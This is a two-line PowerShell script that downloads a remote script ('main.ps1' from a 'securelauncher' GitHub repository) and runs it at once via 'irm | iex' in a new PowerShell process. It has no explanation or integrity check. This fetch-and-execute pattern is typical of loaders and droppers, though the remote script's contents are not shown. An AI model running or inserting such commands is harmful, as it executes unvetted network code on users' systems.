$command = "irm https://raw.githubusercontent.com/TheSpinningOrange/securelauncher/refs/heads/main/main.ps1 | iex"
Start-Process powershell -ArgumentList "-Command", $command
